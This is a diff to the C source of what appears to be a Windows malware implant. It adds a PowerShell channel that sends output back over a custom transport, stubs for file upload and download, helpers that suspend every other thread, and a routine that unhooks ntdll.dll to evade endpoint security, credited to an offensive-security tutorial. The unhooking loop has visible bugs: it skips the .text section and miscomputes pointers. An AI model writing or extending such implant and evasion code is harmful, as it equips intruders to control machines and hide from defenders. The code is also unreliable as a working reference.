@@ -1,10 +1,12 @@
 #define _AMD64_
 #include<synchapi.h>
+#include<TlHelp32.h>
+#include<Psapi.h>
 
 #include "../transport/transport.h"
 #include "jobs.h"
 
-int track_job(HANDLE job_thread, struct jobs_t* jobs) {
+int track_job(HANDLE* job_thread, struct jobs_t* jobs) {
     /*
         find next active in use slot
         set handle to job_thread job
@@ -15,7 +17,7 @@ int track_job(HANDLE job_thread, struct jobs_t* jobs) {
     int next_free_slot = -1;
     int cur_slot = 0;
     
-    while (next_free_slot == -1 || cur_slot != MAX_JOBS) {
+    while (next_free_slot == -1 && cur_slot != MAX_JOBS) {
         if (jobs->jobs[cur_slot].active == JOB_ACTIVE) cur_slot++;
         else next_free_slot = cur_slot;
     }
@@ -30,12 +32,12 @@ int track_job(HANDLE job_thread, struct jobs_t* jobs) {
     return next_free_slot;
 }
 
-void untrack_job(HANDLE job_thread, struct jobs_t* jobs) {
+void untrack_job(HANDLE* job_thread, struct jobs_t* jobs) {
     int cur_slot = 0;
 
     EnterCriticalSection(&jobs->jobs_cs);
     
-    while (jobs->jobs[cur_slot].job_thread != job_thread ||
+    while (jobs->jobs[cur_slot].job_thread != job_thread &&
         cur_slot != MAX_JOBS)
         cur_slot++;
 
@@ -178,6 +180,7 @@ void implant_powershell(tremont_stream_id stream_id, Tremont_Nexus* nexus) {
         );
 
         if (avail > 0) {
+            memset(temp_out, 0, sizeof(temp_out));
             ReadFile(info.child_out_rd, temp_out, sizeof(temp_out), &read, NULL);
             tremont_send(stream_id, temp_out, read, nexus);
         }
@@ -187,7 +190,173 @@ void implant_powershell(tremont_stream_id stream_id, Tremont_Nexus* nexus) {
     _cleanup_powershell(&info);
 }
 
-int implant_download(struct download_req_t* req) {
-    /* TODO */
+int implant_upload(struct upload_req_t* req) {
+    /*
+        Expand path
+        CreateFileA
+        recv
+        write to file
+    */
     return 0;
+}
+
+int implant_download(struct download_req_t* req) {
+    /*
+        Expand path
+        CreateFileA
+        read from file
+        send
+    */
+    return 0;
+}
+
+void _freeze_all_other_threads() {
+    uint32_t my_thread_id;
+    my_thread_id = GetCurrentThreadId();
+
+    HANDLE snapshot;
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+
+    THREADENTRY32 thread_entry;
+    thread_entry.dwSize = sizeof(thread_entry);
+    Thread32First(snapshot, &thread_entry);
+
+    do {
+        if (thread_entry.th32ThreadID == my_thread_id) continue;
+
+        HANDLE thread_handle;
+        thread_handle = OpenThread(THREAD_ALL_ACCESS,
+            FALSE,
+            thread_entry.th32ThreadID);
+
+        if (thread_handle != 0) {
+            SuspendThread(thread_handle);
+            CloseHandle(thread_handle);
+        }
+
+        thread_entry.dwSize = sizeof(thread_entry);
+    } while (Thread32Next(snapshot, &thread_entry));
+}
+
+void _unfreeze_all_other_threads() {
+    uint32_t my_thread_id;
+    my_thread_id = GetCurrentThreadId();
+
+    HANDLE snapshot;
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+
+    THREADENTRY32 thread_entry;
+    thread_entry.dwSize = sizeof(thread_entry);
+    Thread32First(snapshot, &thread_entry);
+
+    do {
+        if (thread_entry.th32ThreadID == my_thread_id) continue;
+
+        HANDLE thread_handle;
+        thread_handle = OpenThread(THREAD_ALL_ACCESS,
+            FALSE,
+            thread_entry.th32ThreadID);
+
+        if (thread_handle != 0) {
+            ResumeThread(thread_handle);
+            CloseHandle(thread_handle);
+        }
+
+        thread_entry.dwSize = sizeof(thread_entry);
+    } while (Thread32Next(snapshot, &thread_entry));
+}
+
+//based off of https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
+int implant_unhookl(struct unhool_req_t* req) {
+    _freeze_all_other_threads();
+
+    MODULEINFO module_info;
+    HANDLE process_handle = GetCurrentProcess();
+    HMODULE ntdll_module = GetModuleHandleA("ntdll.dll");
+    if (ntdll_module == NULL) return -1;
+
+    GetModuleInformation(process_handle,
+        ntdll_module, &module_info, sizeof(module_info));
+
+    void* ntdll_base = module_info.lpBaseOfDll;
+    HANDLE ntdll_file = CreateFileA(
+        "c:\\windows\\system32\\ntdll.dll", 
+        GENERIC_READ, 
+        FILE_SHARE_READ, 
+        NULL, 
+        OPEN_EXISTING, 
+        0, 
+        NULL
+    );
+   
+    HANDLE ntdll_filemap = CreateFileMapping(ntdll_file, 
+        NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    if (ntdll_filemap == NULL) goto ERR;
+    
+    void* ntdll_mmap = MapViewOfFile(ntdll_filemap,
+        FILE_MAP_READ, 0, 0, 0);
+    if (ntdll_mmap == NULL) goto ERR;
+
+    PIMAGE_DOS_HEADER dos_header;
+    dos_header = (PIMAGE_DOS_HEADER)ntdll_base;
+
+    PIMAGE_NT_HEADERS nt_headers;
+    nt_headers = (PIMAGE_NT_HEADERS)(
+        (DWORD_PTR)ntdll_base + dos_header->e_lfanew
+    );
+
+    for (uint16_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER section_header;
+        section_header = (PIMAGE_SECTION_HEADER)(
+            (DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + 
+            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)
+        );
+
+        if (!strncmp(section_header->Name, ".text", 5)) continue;
+        
+        BOOL is_protected;
+        uint32_t old_protection;
+        uint32_t size_of_text;
+        
+        DWORD* file_text_section;
+        DWORD* running_text_section;
+
+        size_of_text = section_header->Misc.VirtualSize;
+
+        running_text_section = (DWORD*)ntdll_base +
+            section_header->VirtualAddress;
+
+        file_text_section = (DWORD*)ntdll_mmap +
+            section_header->VirtualAddress;
+
+        is_protected = VirtualProtect(
+            running_text_section,
+            size_of_text,
+            PAGE_READWRITE,
+            &old_protection
+        );
+        
+        memcpy(running_text_section, file_text_section, size_of_text);
+        
+        is_protected = VirtualProtect(
+            running_text_section,
+            size_of_text,
+            old_protection,
+            &old_protection
+        );
+    }
+
+    _unfreeze_all_other_threads();
+    CloseHandle(process_handle);
+    CloseHandle(ntdll_module);
+    CloseHandle(ntdll_file);
+
+    return 0;
+
+ERR:
+    _unfreeze_all_other_threads();
+    CloseHandle(process_handle);
+    CloseHandle(ntdll_module);
+    CloseHandle(ntdll_file);
+    return -1;
 }
